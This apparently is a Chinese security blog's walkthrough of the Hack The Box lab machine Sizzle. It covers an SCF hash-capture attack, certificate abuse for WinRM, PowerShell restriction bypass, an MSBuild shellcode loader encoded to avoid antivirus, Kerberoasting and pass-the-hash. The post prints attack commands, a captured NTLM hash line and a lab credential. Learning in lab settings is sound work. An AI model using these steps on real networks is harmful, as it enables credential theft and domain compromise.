> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/af5ju-Gn9M52cx6cBjbsyw)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **82** 篇文章，本公众号会每日分享攻防渗透技术给大家。

靶机地址：https://www.hackthebox.eu/home/machines/profile/169

靶机难度：高级（5.0/10）

靶机发布日期：2019 年 5 月 8 日

靶机描述：

Sizzle is an “Insane” difficulty WIndows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/tnNTe6QOaYx4HLiasWDSSibkvBwkySahn1jUGyrqSWWsCrd8WeibGicCbaDB9b5K4cTlaCxcmzv2uyEWNrQke47Vag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/gOGib2VkpLWkbtKmMsQqySMxAsrxHvBeChSJUKPDZTQH3Gde0ayHZZrpyZNH0ibCdnibeicWkNf9sQ9ldtYghV6EUA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/VHdxGs4QuYyTh2Ph5K8FUYeMSJgG10R6UvAkBSAhsibgPr3lEDRbtNqZKEuMkIHTcB9sm1tjN38OW3gSoLFfDlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDhyibJIpafADRPXnibNMlPkztR7JukyyAPxHyM8s1JpAv2qLhX1MNH5mQ/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.103....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBD0qow9cUvunj6G3GSyPKmmJrzrJibhzbkIlfAVvc4k3NLZibb1mIiaszWQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDzqp064nGHdhpicFL7ESibJEEd5TTrYWvsjHIGsa1QVz4lgEREqFYImvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDYsqxfR0ah8FFT72licjoSD9F2HWCc0GGylxakVpZnGTjZgmRpWA8qyg/640?wx_fmt=png)

Nmap 发现该域为 HTB.LOCAL，3389ldap 的 sslcert 还存在 sizzle.htb.local 域名，允许匿名 ftp 登录，http 和 https 都在运行 IIS，445 端口，5985 的 WinRm 端口... 等等端口服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDn0j6c8IO6xggTXdbU5gWKYNLcia2uZljSGyTI01ia89RLSia5vamzfic0g/640?wx_fmt=png)

访问 80，真香的烤肉图片...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDStlXql90p4HCg2iaJe70oZz4W98KUhtTIciafAt5W7t8hQMjE1nRqplw/640?wx_fmt=png)

http 这边目前没发现什么...FTP 看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDwOXPKACsicfqqKviaaDoiamtnegbhkUqWhZ5v1CeJrNC5H0oiaSCJVaic8Q/640?wx_fmt=png)

FTP 是空目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDLIzW4QVQrZ7SA7Qw8csX86lHlicNDeJCRbPtdHoqia2Y2vxUaREq7K7Q/640?wx_fmt=png)这有两个部门存在，Department 和 Operations...CertEnroll 是默认的 ADCS share（这里存在证书服务共享，发现了 http://10.10.10.103/certsrv）... 另外两个本地 share

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDNuRuR1LvPaCnibhGxJElRJwmP2fdQAbl3ZrPTLibCP8PVAuKopGhQr6A/640?wx_fmt=png)

可以看到需要密匙，先放放

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBD2P9OPdW5tABhoJicvqsFAwCXxp8dRpHfvDBLVHgC6orUfP4Fee5NNww/640?wx_fmt=png)

Department Shares 是 guest 用户可读的，进去看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDzMbe7vxiaxib5EyrN12VkgbFAsm6slQe87bLso7JrgHdY8q1zkAwWYsg/640?wx_fmt=png)

空口令进来了，存在很多目录，users 感兴趣

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDrGZOpeOluwNlvTB32gG5tGnqZp6rI3r58My4JxEnOBHur4Pa177z7Q/640?wx_fmt=png)

存在 Public 目录... 通常应该 users/Public 是可以上传文件的... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDOXylbvO8tjHwkPO2odEzaPZ4xibhibxNHkvZ3YtgxWvnHY1icoa4drgtw/640?wx_fmt=png)

测试是可写入的... 可以进行

```
[scf](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
```

文件攻击...  

可以参考，开始进行 scf 攻击

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDia1DAvWP7nJdA9YibQHv3srLeRImfkII3KRQ9NJHqia1nbhKpFjWeia8Yg/640?wx_fmt=png)

创建好了 @dayu.scf...@符号会将 dayu.scf 放置在共享驱动器的顶部

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDO1viaia3ypdBgHrj2dqQUsyw5PI9yxWzOOCQEgHKmjK0qLcT0HeaSQfw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDfN63Zp0ib4GlAsRSibzDuHwUxgQ1kwqoGNbKMgURiafnx4ylEEKbCbdUQ/640?wx_fmt=png)

开启 responder 对 TUN0 接口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDlRRTc7PcxDhlHbfU39tzEnDtU5FptfuGdNHWDYNicUA5arRefmczF6g/640?wx_fmt=png)

用户会几分钟左右浏览该目录，浏览后都会自动尝试通过出发 @dayu.scf 然后连接到我的 smb，利用 responder 抓流量哈希即可...

等待几分钟... 抓到了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDUlTtANoHhTrXqBSgag7s4uNJYq6y2Kvmhn5LIGSBISVFDQhpGrOZBw/640?wx_fmt=png)

通过 john 爆破哈希，获得了账号密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDhKDIqV0IOHEoodvjH8h5pzgShYvBwYxzxuxgLibMPiaOo9MX0maVAVgg/640?wx_fmt=png)

在此站点中，有不同的选项来管理证书，要做的就是单击 “请求证书”，请求一个新的证书，然后提交高级证书请求即可.

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDtgekXVwZbvMcdPTgicpzbZqZQ04v88zmm4PgNLo86XFiaxTicgxfvibic8A/640?wx_fmt=png)

```
openssl req -new -newkey rsa:2048 -nodes -keyout caca.key -out dayussl.csr
```

这里用 openssl 生成一个证书...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDJAdSB2m1yibIeGB9d42m7Orp3oy3pFAYAQjhhs4ibKg10aq0Y3zt4oxQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDiaYmrb5iapToYrkrr761xCicPknfSPpLsXJYsJib6ia11yYJp4I9pNTTsYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDz2nPfRxugOGAxcaYWXGnUic4DHVVicGV8nfAZgpLyeWVAOQM5rA6ibN8A/640?wx_fmt=png)

这里选择 Usercert 作为模板...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDtHOJrzAP4Mld7gLicjbP3RF8vu7gxBMKW3QNwgczxhWOPibjWQia01dyw/640?wx_fmt=png)

将证书下载即可...

前面 nmap 就知道 WinRm 端口是开放的...

Windows 远程管理（WinRM）是 WS-Management Protocol 的 Microsoft 实现，WS-Management Protocol 是基于标准的简单对象访问协议（SOAP）的，防火墙友好的协议，允许来自不同供应商的硬件和操作系统进行互操作。

而 WinRM 正在运行 Windows 远程管理，该服务允许通过接口连接远程计算机，SOAP 并且可以通过证书进行身份验证..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBD9egB8LEMMkUzYY1nQwaiaYcyZe68Hf2xPmzhmvNUfgvR1jpicicyBtQ0A/640?wx_fmt=png)

这里准备使用 WinRm 进行登录...

可以看到 5985 端口在使用 http，5986 使用 https...

这里需要简单编写下 EXP 即可登陆... 参考

```
[WinRm](https://github.com/WinRb/WinRM)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDLLNxVc41NTuKUFxiaxGWuI0xKVO9KnrFtqYVtXqezIOPmiaveXu7WVaQ/640?wx_fmt=png)

下面还有很多方式方法，自行查看....

记得下载

```
git clone https://github.com/WinRb/WinRM.git     gem install -r winrm
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDic0Yz7Ic7JWoyVYtoYceNpPH6QQicN12YXediblatUFSTgWc5kEeHhg5A/640?wx_fmt=png)

成功登陆...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDYBoVo7iaEyOB3n4LIcTmwVsb2RGiabEA7bjKyFFUvGhicvYDB8EANQApA/640?wx_fmt=png)

检查了下，没什么特别信息.. 这里的思路是上传 shell 提权即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDFVjCQGJcLGjWzDqN9xzr6zzfQmsXEOgyGIjsFrbvULXS8Q6abk3ic6A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDYowVNXuV18piahte2lmwpXj05l01VrOlKFaAca4FrT5pbOPCTuPN1xg/640?wx_fmt=png)

上传报错了... 目前处于受限语言模式下，模式禁用了许多 Powershell 功能.....

smb 共享开启也报错...

继续一个一个试...

方法 1：

![](https://mmbiz.qpic.cn/mmbiz_png/ru93nXbREC3lsblTT6unZTCoWcPia8D84uaTauv8WPKZPQAePE6Emc28HfL5UqaUs7ia4J1pib3JRW5sS6TnHViazA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDe3HB9bgehOicDrEzK6qKamPd89jeY5zVmXRmesJAe7D3vOcvK49UunQ/640?wx_fmt=png)

wget 成功上传了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBD6YN8s6vic79Quia9v42HibxKEjbOIibnIgtOul9986bUibvedDU4ZXYsTzA/640?wx_fmt=png)

需要执行激活... 报错了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDliaaVo5OuMKMlPcDGyHNgTRIvgPOOmXiauOsdVLQ69FIwRSricIIJU6Yg/640?wx_fmt=png)

利用 powershell V2 来绕过了报错限制... 成功执行了 nishang 的 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDCibEukW43IKTta5J0blueJgJXfj21alLUtibUTBaqzPuib67b2NBiasIlQ/640?wx_fmt=png)

可以看到，通过尝试收集信息... 在 system32 下存在 file.txt 文件... 保存了 NTLM 哈希值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDtyv8xk9RQnOIicvqlR0Lia2ibmsg1yRzzE92fgktgmo8Gu1WeVvsz3lKQ/640?wx_fmt=png)

这里破解了

```
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
```

mrlky 用户密码...

administrator 哈希值破解不了，估计是错误的...

这里利用 / impacket/examples/secretsdump.py 对 mrlky 继续获取 administrator 的 NTLM 哈希...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBD0hec0cLibxkU24Saq3WfaGDibxGs5cvXwQJFwpVqsHgEwZq6ZI6DhkSA/640?wx_fmt=png)

又获取了一个哈希值...

这里我尝试破解还是不对...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDBDoKichic6JdJA1OnfGZP0qSibZEJ7dqJA5h0Xd0KzyMIvmXRVibicnJqjg/640?wx_fmt=png)

我利用了 smb 的 hash 访问 administrator... 成功进了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDATAxAqicZe1bwpPfqYrWmA2sJSuaxP4cb0EsHlBBsianIkJrDQKOm03A/640?wx_fmt=png)

成功获得了 user 和 root 信息...

这里应该是取巧获得了 user 和 root 信息... 如果没用 NTML 哈希，继续思考还能怎么提权..

方法 2：

![](https://mmbiz.qpic.cn/mmbiz_png/ru93nXbREC3lsblTT6unZTCoWcPia8D84uaTauv8WPKZPQAePE6Emc28HfL5UqaUs7ia4J1pib3JRW5sS6TnHViazA/640?wx_fmt=png)

```
https://www.blackhillsinfosec.com/a-toast-to-kerberoast/
```

利用 Kerberoast 进行攻击，需要利用 msf

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDxpdl9R1VKXtrTIA7svsgiarm17icNEia1oztmK3kF94f8ibEuDuYmQt4GA/640?wx_fmt=png)

在 shellcode 部分中，将用 MSFvenom 替换要生成的代码，将其编码为 100，以避免被防病毒软件检测到... 配合

```
https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml
```

生成 EXP 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDUGiauH74AHv04QZwoXeicDeygnibkwF6iaUv8t3gF55DOIjNPuqQicOY7zA/640?wx_fmt=png)

可以看到，上传了 xml 文件，但是转换成了. bin 文件，这不要紧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBD6qSw16SopiaJFhynwvb6cvgCDkjibbnrDZGepXjNMLKT58pBwGqTpIibw/640?wx_fmt=png)

```
mv .\c53d75a50e089ebe3e39214838d75b04e56324a0.bin  dayushell2.csproj
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe dayushell2.csproj
```

通过将 bin 文件修改回 csproj 即可... 然后利用 Msbuild 执行 csproj 的 shellcode... 成功获得了反向外壳...

```
https://www.blackhillsinfosec.com/a-toast-to-kerberoast/
```

这里将利用 kerberoasting 进行提权...

有了一个 meterpreter 会话后，可以添加路由并设置代理，然后使用代理 GetUserSPNs.py 并查看是否有任何用户可以使用 kerberoastable...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNucSkib8tMqgRrR0aTX4gBDf2aGngXgEviamr5vH3K5ETJwee9HVRsS2a80tvPceVJ7wkLxWkEQA7Q/640?wx_fmt=png)

配置 proxychains 为使用端口 8080，route add 10.10.10.0 255.255.255.0 1 这将添加整个内部子网的路由，其中 1 为会话号...

```
proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972
```

然后获得了 mrlky 的哈希值...john 破解后，继续和方法 1 一样，获得 user 和 root.... 或者使用

```
[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
```

进行 hashes 哈希值登陆也能获得信息...  

还可以利用

```
[Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
```

直接获取管理员权限... 等等

这里方法非常多... 只要肯深挖... 加油！！

很好的一台靶机！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台中等的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/tnNTe6QOaYx4HLiasWDSSibkvBwkySahn1jUGyrqSWWsCrd8WeibGicCbaDB9b5K4cTlaCxcmzv2uyEWNrQke47Vag/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)